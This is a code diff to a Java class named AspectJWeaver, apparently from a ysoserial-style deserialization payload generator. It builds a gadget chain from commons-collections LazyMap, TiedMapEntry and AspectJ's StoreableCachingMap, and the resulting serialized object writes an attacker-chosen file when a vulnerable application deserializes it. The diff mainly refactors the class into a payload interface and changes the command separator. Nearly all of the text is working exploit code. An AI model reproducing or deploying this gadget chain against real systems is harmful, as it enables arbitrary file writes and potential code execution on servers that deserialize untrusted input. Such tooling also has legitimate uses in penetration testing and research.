@@ -9,28 +9,28 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
+import java.io.Serializable;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
-public class AspectJWeaver {
+public class AspectJWeaver implements ObjectPayload<Serializable> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String command = String.valueOf(type);
-        int    sep  = command.lastIndexOf(';');
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
+        int    sep     = command.lastIndexOf(':');
         if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
         }
-        String[] parts    = command.split(";");
+        String[] parts    = command.split(":");
         String   filename = parts[0];
         byte[]   content  = Base64.decodeBase64(parts[1]);
 
-        Constructor  ctor        = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
-        Object       simpleCache = ctor.newInstance(".", 12);
+        Constructor<?> ctor        = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
+        Object         simpleCache = ctor.newInstance(".", 12);
         Transformer  ct          = new ConstantTransformer(content);
         Map          lazyMap     = LazyMap.decorate((Map) simpleCache, ct);
         TiedMapEntry entry       = new TiedMapEntry(lazyMap, filename);
@@ -46,7 +46,7 @@ public class AspectJWeaver {
         Reflections.setAccessible(f);
         HashMap innimpl = (HashMap) f.get(map);
 
-        Field f2 = null;
+        Field f2;
         try {
             f2 = HashMap.class.getDeclaredField("table");
         } catch (NoSuchFieldException e) {
@@ -79,5 +79,10 @@ public class AspectJWeaver {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Serializable getObject(String command) throws Exception {
+        return null;
     }
 }
